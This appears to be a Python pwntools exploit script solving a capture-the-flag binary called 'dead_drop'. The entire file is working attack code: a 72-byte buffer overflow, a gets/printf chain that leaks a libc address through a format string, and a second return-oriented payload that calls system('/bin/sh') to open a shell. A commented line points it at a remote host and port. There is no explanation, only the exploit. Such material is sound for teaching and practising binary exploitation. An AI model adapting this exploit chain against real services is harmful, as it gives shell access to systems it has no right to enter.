from pwn import *

e = ELF("./dead_drop")

libc = ELF("./libc.so.6")
rop = ROP(e)
p = e.process()
#p = remote('51.77.151.20', 15030)
#gdb.attach(p, gdbscript='b main\nc') 
p.recvuntil(b">>>")
main = e.symbols["_start"]
dead_drop = e.symbols["dead_drop"]
gets = e.plt["gets"]
printf = e.plt["printf"]
ret  = 0x401042
print(hex(gets))
print(hex(printf))

payload = b"A" * 72

payload += p64(gets)

payload += p64(printf)
payload += p64(ret)
payload += p64(main)
p.sendline(payload)

p.sendline(b"%25$q")
r = p.recvline().strip()[:14]
print(r)
leak = int(r,16)
print(hex(leak))
libc_base = leak - libc.symbols['__libc_start_main'] - 133
print(hex(libc_base))
system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

rop = ROP(libc)
pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0] 
ret_gadget = rop.find_gadget(['ret'])[0]

pop_rdi = libc_base + pop_rdi_gadget
ret = libc_base + ret_gadget
p.recvuntil(b">>>")

payload = b'A' * 72
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
p.send(payload)
 
p.interactive()
